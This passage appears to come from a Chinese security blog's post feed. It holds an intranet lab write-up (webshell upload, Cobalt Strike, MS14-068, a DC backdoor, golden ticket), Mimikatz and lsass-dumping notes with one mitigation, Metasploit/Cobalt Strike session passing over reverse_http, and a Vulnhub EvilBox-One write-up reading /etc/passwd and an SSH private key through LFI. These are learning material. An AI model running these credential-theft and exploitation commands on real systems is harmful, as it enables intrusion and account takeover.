src="https://res.cloudinary.com/lin1109/image/upload/v1631927418/5_u4bvzx.png"></p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><h3 id="子域名爆破网站后台"><a href="#子域名爆破网站后台" class="headerlink" title="子域名爆破网站后台"></a>子域名爆破网站后台</h3><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631927689/6_d8dfsf.png"></p><h3 id="后台上传文件-getshell"><a href="#后台上传文件-getshell" class="headerlink" title="后台上传文件 getshell"></a>后台上传文件 getshell</h3><p>使用 admin&#x2F;admin666 登录</p><p>经过测试，这个后台验证码可以多次复用，尝试爆破也是可以的</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631927897/7_np0dop.png"></p><p>上传一个冰蝎马连接即可</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631928056/8_gonyez.png"></p><h2 id="Cobalt-Strike-后渗透"><a href="#Cobalt-Strike-后渗透" class="headerlink" title="Cobalt Strike 后渗透"></a>Cobalt Strike 后渗透</h2><p>因为目标主机是 windows 环境 我们上线 cs 进行后续渗透</p><p>查了下目标主机没有 AV，直接上线 cs<br><img src="https://res.cloudinary.com/lin1109/image/upload/v1631931270/9_t2umoe.png"></p><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p><strong>hash 和密码明文</strong></p><p>上线权限很高不用提权，先跑一波 hash 和明文密码</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631931821/10_zbtbqp.png"></p><p>获得两个账户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hackbox\web!@#Qwe456 \\域内普通账户</span><br><span class="line">Administrator  T1//@1607#@ \\本地管理员账户</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631932210/10_rxy2st.png"></p><h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all </span><br></pre></td></tr></table></figure><p>双网卡主机、可以看到当前处在 hackbox.com 的域环境中</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631933741/14_kkwbig.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure><p>只有一个域</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631934241/18_if0omr.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631934119/17_ghzvhe.png"></p><p><strong>定位域控</strong></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631934014/15_jvjas2.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631934015/16_r45bgh.png"></p><p>DC ip 就是 192.168.150.254</p><h3 id="ms14-068-普通域用户权限提升为域控权限"><a href="#ms14-068-普通域用户权限提升为域控权限" class="headerlink" title="ms14-068 普通域用户权限提升为域控权限"></a>ms14-068 普通域用户权限提升为域控权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">USAGE:</span><br><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">   -p &lt;clearPassword&gt;</span><br><span class="line">--rc4 &lt;ntlmHash&gt;</span><br><span class="line"></span><br><span class="line">-u  域成员名@域名</span><br><span class="line">-s  域成员sid</span><br><span class="line">-d  域控制器地址</span><br><span class="line">-p  域成员密码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 192.168.150.254 -p !@#Qwe456</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631937769/19_dop5tl.png"></p><p>使用工具将.ccache 文件转化为 kirbi 格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rvazarkar/KrbCredExport</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 KrbCredExport.py TGT_web@hackbox.com.ccache  dc.ticket</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631938114/20_oao5wv.png"></p><p><strong>导入生成的票据</strong></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631938429/21_bjnfng.png"></p><h3 id="上线域控"><a href="#上线域控" class="headerlink" title="上线域控"></a>上线域控</h3><p>票据已经注入了，现在身份是域管理员我们可以直接访问域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631938662/21_g103kx.png"></p><p><strong>拷贝后门文件至域控</strong></p><p>由于 DC 不出网 考虑正向连接 使用 smb 上线</p><p>建立一个 smb 监听 生成 exe 后门即可</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631938922/22_hhg1w0.png"></p><p><strong>计划任务运行后门上线</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\dc  #查看域控当前时间</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631939565/23_mts6tz.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\dc 12:29:14 c:/smb.exe</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631939565/24_sbub2k.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link dc  //连接域控</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631939569/25_ppeavp.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631939660/26_fodzph.png"></p><h2 id="权限维持之黄金票据"><a href="#权限维持之黄金票据" class="headerlink" title="权限维持之黄金票据"></a>权限维持之黄金票据</h2><h3 id="抓取域控-krbtgt-账户信息"><a href="#抓取域控-krbtgt-账户信息" class="headerlink" title="抓取域控 krbtgt 账户信息"></a>抓取域控 krbtgt 账户信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz&#x27;s lsadump::dcsync /domain:hackbox.com /user:krbtgt</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631940131/27_b3esjp.png"></p><h3 id="制作票据"><a href="#制作票据" class="headerlink" title="制作票据"></a>制作票据</h3><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631940413/28_zdiuah.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mimikatz 学习记录</title>
      <link href="/posts/782722891/"/>
      <url>/posts/782722891/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="Mimikatz-简介"><a href="#Mimikatz-简介" class="headerlink" title="Mimikatz 简介"></a>Mimikatz 简介</h2><p>内网杀器 - Mimikatz 微软见了直流泪</p><p>Mimikatz 为法国人 Benjamin Delpy 编写的一款轻量级的调试工具，国内叫它 “猕猴桃”，在内网渗透过程中，它多数时候是作为一款抓取用户口令的工具。然而 Mimikatz 其实并不只有抓取口令这个功能，它还能够创建票证、票证传递、hash 传递、甚至伪造域管理凭证令牌等。</p><h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><h2 id="Mimikatz-使用方法"><a href="#Mimikatz-使用方法" class="headerlink" title="Mimikatz 使用方法"></a>Mimikatz 使用方法</h2><p>像 Cobalt Strike 和 msf 这些后渗透化工具已经集成了 Mimikatz 的功能，但是有些时候还是需要自己上传一个 Mimikatz 进行操作</p><h3 id="Mimikatz-常用命令"><a href="#Mimikatz-常用命令" class="headerlink" title="Mimikatz 常用命令"></a>Mimikatz 常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">cls         #清屏</span><br><span class="line">standard    #标准模块，基本命令</span><br><span class="line">crypto      #加密相关模块</span><br><span class="line">sekurlsa    #与证书相关的模块</span><br><span class="line">kerberos    #kerberos模块</span><br><span class="line">privilege   #提权相关模块</span><br><span class="line">process     #进程相关模块</span><br><span class="line">serivce     #服务相关模块</span><br><span class="line">lsadump     #LsaDump模块</span><br><span class="line">ts          #终端服务器模块</span><br><span class="line">event       #事件模块</span><br><span class="line">misc        #杂项模块</span><br><span class="line">token       #令牌操作模块</span><br><span class="line">vault       #Windows 、证书模块</span><br><span class="line">minesweeper #Mine Sweeper模块</span><br><span class="line">net</span><br><span class="line">dpapi     #DPAPI模块（通过API或RAW访问）[数据保护应用程序编程接口]</span><br><span class="line">busylight #BusyLight Module</span><br><span class="line">sysenv    #系统环境值模块</span><br><span class="line">sid       #安全标识符模块</span><br><span class="line">iis       #IIS XML配置模块</span><br><span class="line">rpc       #mimikatz的RPC控制</span><br><span class="line">sr98      #用于SR98设备和T5577目标的RF模块</span><br><span class="line">rdm       #RDM（830AL）器件的射频模块</span><br><span class="line">acr       #ACR模块</span><br><span class="line">version   #查看版本</span><br><span class="line">exit      #退出</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug #提升权限命令 mimikatz许多功能都需要管理员权限，如果不是管理员权限不能debug</span><br></pre></td></tr></table></figure><h3 id="抓取明文密码"><a href="#抓取明文密码" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h3><p>在 windows2012 以上的系统不能直接获取明文密码了，当可以搭配 procdump+mimikatz 获取密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # log</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634631291/Xnip2021-10-19_16-14-33_xamzjq.png"></p><h2 id="相关模块"><a href="#相关模块" class="headerlink" title="相关模块"></a>相关模块</h2><h3 id="sekurlsa-模块"><a href="#sekurlsa-模块" class="headerlink" title="sekurlsa 模块"></a>sekurlsa 模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#抓取用户NTLM哈希</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line">sekurlsa::msv  </span><br><span class="line"></span><br><span class="line">#加载dmp文件，并导出其中的明文密码</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords full </span><br><span class="line"></span><br><span class="line">#导出lsass.exe进程中所有的票据</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><h3 id="kerberos-模块"><a href="#kerberos-模块" class="headerlink" title="kerberos 模块"></a>kerberos 模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#列出系统中的票据</span><br><span class="line">kerberos::list</span><br><span class="line">kerberos::tgt</span><br><span class="line"></span><br><span class="line">#清除系统中的票据</span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">#导入票据到系统中</span><br><span class="line">kerberos::ptc 票据路径</span><br></pre></td></tr></table></figure><h3 id="lsadump-模块"><a href="#lsadump-模块" class="headerlink" title="lsadump 模块"></a>lsadump 模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#(在域控上执行)查看域test.com内指定用户Administrator的详细信息，包括NTLM哈希等</span><br><span class="line">lsadump::dcsync /domain:test.com /user:Administrator</span><br><span class="line"></span><br><span class="line">#(在域控上执行)读取所有域用户的哈希</span><br><span class="line">lsadump::lsa /patch</span><br><span class="line"></span><br><span class="line">#从sam.hive和system.hive文件中获得NTLM Hash</span><br><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br><span class="line"></span><br><span class="line">#从本地SAM文件中读取密码哈希</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><h3 id="wdigest"><a href="#wdigest" class="headerlink" title="wdigest"></a>wdigest</h3><p>WDigest 协议是在 WindowsXP 中被引入的，旨在与 HTTP 协议一起用于身份认证。默认情况下，Microsoft 在多个版本的 Windows (Windows XP-Windows 8.0 和 Windows Server 2003-Windows Server 2012) 中启用了此协议，这意味着纯文本密码存储在 LSASS (本地安全授权子系统服务) 进程中。 Mimikatz 可以与 LSASS 交互，允许攻击者通过以下命令检索这些凭据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz #privilege::debug</span><br><span class="line">mimikatz #sekurlsa::wdigest</span><br></pre></td></tr></table></figure><p>在 windows2012 系统以及以上的系统之后这个默认是关闭的如果在 win2008 之前的系统上打了 KB2871997 补丁，那么就可以去启用或者禁用 WDigest。Windows Server2012 及以上版本默认关闭 Wdigest，使攻击者无法从内存中获取明文密码。Windows Server2012 以下版本，如果安装了 KB2871997 补丁，攻击者同样无法获取明文密码。</p><p>配置如下键值即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest</span><br></pre></td></tr></table></figure><p>使用 powershell 进行更改</p><p>UseLogonCredential 值设置为 0, WDigest 不把凭证缓存在内存；UseLogonCredential 值设置为 1, WDigest 就把凭证缓存在内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#开启Wdigest Auth</span><br><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br><span class="line"></span><br><span class="line">#关闭Wdigest Auth</span><br><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProvid</span><br></pre></td></tr></table></figure><h2 id="LSA-保护"><a href="#LSA-保护" class="headerlink" title="LSA 保护"></a>LSA 保护</h2><p>如何防止 mimikatz 获取一些加密的密文进行 PTH 攻击呢！其实微软推出的补丁 KB2871997 是专门针对 PTH 攻击的补丁，但是如果 PID 为 500 的话，还是可以进行 PTH 攻击的！本地安全权限服务 (LSASS) 验证用户是否进行本地和远程登录，并实施本地安全策略。 Windows 8.1 及更高版本的系统中，Microsoft 为 LSA 提供了额外的保护，以防止不受信任的进程读取内存或代码注入。Windows 8.1 之前的系统，攻击者可以执行 Mimikatz 命令来与 LSA 交互并检索存储在 LSA 内存中的明文密码。</p><p>这条命令修改键的值为 1，即使获取了 debug 权限，也不能直接获取明文密码和 hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure><h2 id="获取高版本-windows-系统的密码凭证"><a href="#获取高版本-windows-系统的密码凭证" class="headerlink" title="获取高版本 windows 系统的密码凭证"></a>获取高版本 windows 系统的密码凭证</h2><p>使用 procdump 将 lsass dump 下来（需要管理员权限）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe 1.dmp</span><br></pre></td></tr></table></figure><p>使用 mimikatz 读取密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;log&quot; &quot;sekurlsa::minidump 1.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure><h2 id="msf-中-kiwi-模块"><a href="#msf-中-kiwi-模块" class="headerlink" title="msf 中 kiwi 模块"></a>msf 中 kiwi 模块</h2><p>注：kiwi 默认加载 32 位，如果目标系统位 64 位，将进程迁移到 64 位程序的进程中。</p><p>使用前先 load kiwi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">creds_all #列举所有凭据</span><br><span class="line">creds_kerberos #列举所有kerberos凭据</span><br><span class="line">creds_msv #列举所有msv凭据</span><br><span class="line">creds_ssp #列举所有ssp凭据</span><br><span class="line">creds_tspkg #列举所有tspkg凭据</span><br><span class="line">creds_wdigest #列举所有wdigest凭据</span><br><span class="line">dcsync #通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm #通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create #创建黄金票据</span><br><span class="line">kerberos_ticket_list #列举kerberos票据</span><br><span class="line">kerberos_ticket_purge #清除kerberos票据</span><br><span class="line">kerberos_ticket_use #使用kerberos票据</span><br><span class="line">kiwi_cmd #执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam #dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets #dump出lsa的密文</span><br><span class="line">password_change #修改密码</span><br><span class="line">wifi_list #列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared #列出共享wifi配置文件/编码</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf与cs互传sessions会话</title>
      <link href="/posts/2112158442/"/>
      <url>/posts/2112158442/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><blockquote><p>Cobalt Strike 和 msf 有很多互补的地方，在渗透测试中一般都是结合使用，所以有时候就需要互相传递会话给对方。</p></blockquote><h2 id="msf-派生会话给-cs"><a href="#msf-派生会话给-cs" class="headerlink" title="msf 派生会话给 cs"></a>msf 派生会话给 cs</h2><p>前提条件：</p><p>msf 必须获得一个 system 权限的会话才可以注入到其它进程，用 background 把会话挂到后台，选用其他 exploit 用于传递会话即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/x64/meterpreter/reverse_http #选用的payload一定要跟cs下监听的payload方式一样</span><br><span class="line">set DisablePayloadHandler true #禁止产生一个新的handler</span><br><span class="line">set LHOST IP #ip为cs监听会话用的ip</span><br><span class="line">set LPOR#端口为cs对应的接受反弹shell的端口</span><br><span class="line">set pid  #设置派生给cs后木马进程的pid进程号，如果有system权限则可以指定一个具有system权限的进程，这样cs接收到会话也是最高权限</span><br><span class="line">set session number #设置需要派送的meterpreter</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h2 id="cs-派生会话给-msf"><a href="#cs-派生会话给-msf" class="headerlink" title="cs 派生会话给 msf"></a>cs 派生会话给 msf</h2><p>首先在 msf 上监听自己的 ip 跟端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http  #跟cs上选用的payload一样</span><br><span class="line">set lhost  #本机ip</span><br><span class="line">set lport  #接受的端口</span><br><span class="line">exploit  #执行</span><br></pre></td></tr></table></figure><p>然后 cs 那边创建一个 foreign 监听的 listeners</p><p>Listeners 的 ip 为 msf 的 ip，端口为 msf 监听的端口（注：如果 msf 是内网下的，则需要把端口映射到公网，或者使用 ngrok 等工具做流量转发）</p><p>然后，回到 cs 上，选中拿下的计算机会话，右键选中 spawn，然后在弹出来的框中选择刚刚创建的 listeners 监听器，然后执行。此时，msf 下即可看到已经拿到了一个新的会话。值得注意的是，cs 派送给 msf 的时候尽量选择 tcp 的 payload 去派送。</p><p>注意：前期利用的 payload 载荷一定要跟目标系统的系统位数一致，否则后面传递会话的时候会出现问题。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - EvilBox-One WriteUp</title>
      <link href="/posts/345777019/"/>
      <url>/posts/345777019/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p>Machines Name：EvilBox-One</p><p>Difficulty：easy</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>使用 Virtualbox 直接导入 ova 文件即可</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/6ae3d4cb07022250.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>确定目标 ip 及端口开放情况</strong></p><p>nmap 扫描本地或者直接看靶机中显示的 ip</p><p>我本机是 192.168.1.0&#x2F;24 网段 靶机是 nat 模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -P0 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>确定目标 ip 和开放端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.1.21</span><br><span class="line">Host is up (0.0063s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:4A:54:A8 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure><p>访问 80 端口发现是 Apache 默认页</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/b2ac0db1ffdabe1c.png"></p><p>什么都没有的状况下只能用 dirsearch 扫一遍目录了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.1.21/</span><br></pre></td></tr></table></figure><p>发现存在一个 secret 目录</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/c97d9e9be21c968b.png"></p><p>访问 &#x2F;secret&#x2F;index.html 和 secret &#x2F; 都是空页面 只能继续扫 secret 下的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.1.21/secret</span><br></pre></td></tr></table></figure><p>发现存在 evil.php 文件 (这里刚开始使用默认字典没扫出来、换了字典才扫出来的)</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1630669099/4_katzs1.png"></p><p>走到这路又走窄了，发现一个 evil.php 文件，猜测可能是一个后门？ Fuzz 一波 get 参数看看</p><p>这里使用一个叫 ffuf 的模糊测试工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -c -u &quot;http://192.168.1.21/secret/evil.php?FUZZ=/etc/passwd&quot;  -w ./list.txt -fs 0#list.txt是字典  -fs 0 过滤响应包大小为0的返回 -c 颜色区分显示</span><br></pre></td></tr></table></figure><p>发现存在一个 Get 参数 command</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/82c38346e0db8558.png"></p><p>访问 &#x2F;secret&#x2F;evil.php?command&#x3D;&#x2F;etc&#x2F;passwd 发现返回了 &#x2F;etc&#x2F;passwd 文件的内容 可能是任意文件包含也可能是任意文件读取</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1630671885/6_cbru0c.png"></p><p>发现一个 mowree 用户 并且知道用户家目录路径</p><p>尝试包含 &#x2F;etc&#x2F;shadow 文件 失败了 也没发现其它什么东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=evil.php#使用php伪协议读取一下evil.php文件</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1630729976/15_lmb8lz.png"></p><p>返回 base64 编码数据 解码 base64 evil.php 存在任意文件包含</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1630729976/16_t635ua.png"></p><p>如果 PHP 配置 “allow_url_open” 和 “allow_url_include” 为 True，那么可以进行 RFI (远程文件包含) 执行后门，这里试了不行。</p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>综合以上信息，唯一思路就是找一找敏感信息了，比如配置文件、ssh 公钥、私钥之类的，可能存在密码的文件</p><p>从 mowree 这个用户入手 fuzz 一波</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -c -u &quot;http://192.168.1.21/secret/evil.php?command=/home/mowree/FUZZ&quot;  -w ./list1.txt</span><br></pre></td></tr></table></figure><p>发现 ssh 公钥和私钥信息</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1630674306/7_rgd4pc.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.21/secret/evil.php?command=/home/mowree/.ssh/id_rsa #私钥</span><br></pre></td></tr></table></figure><p><img 